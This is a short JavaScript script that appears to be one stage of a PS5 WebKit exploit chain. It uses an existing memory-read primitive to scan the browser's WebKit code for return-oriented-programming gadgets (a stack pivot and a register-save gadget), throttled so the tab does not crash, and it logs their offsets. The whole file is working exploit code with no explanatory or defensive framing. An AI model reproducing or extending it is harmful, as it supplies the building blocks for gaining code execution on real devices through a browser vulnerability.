// hunt2 — NO libkernel reads (single LK aim kills tab: .text protected).
// WebKit-only, 8KB/tick, read32, 500ms sleeps.
(async () => {
  const say = async (s) => { try { await log("[hunt2] " + s); } catch(e){} };
  await say("begin wk=0x" + Number(PS5.webkitBase||0).toString(16));
  const WK = Number(PS5.webkitBase);
  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
  const LIM = 0x200000, CH = 0x2000;
  let pivot=null, save=null, n=0;
  outer:
  for(let off=0; off<LIM; off+=CH){
    for(let i=off; i<off+CH; i+=4){
      let d; try{ d = Number(read32(WK+i))>>>0; }catch(e){ await say("fault @+"+i.toString(16)); break outer; }
      if(d===0xc3e78b48 && pivot===null){ pivot=i; await say("FOUND pivot_a rva=0x"+i.toString(16)); }
      if(d===0xc3278948 && save===null){ save=i; await say("FOUND save rva=0x"+i.toString(16)); }
      if((d&0xffffff)===0xc35c57 && pivot===null){ pivot=i; await say("FOUND pivot_b rva=0x"+i.toString(16)); }
      if(pivot!==null && save!==null) break outer;
    }
    n++;
    if(n%8===0) await say("progress off=0x"+off.toString(16));
    await sleep(500);
  }
  await say("DONE pivot="+pivot+" save="+save);
  try{ send_notification("hunt2 done"); }catch(e){}
})();
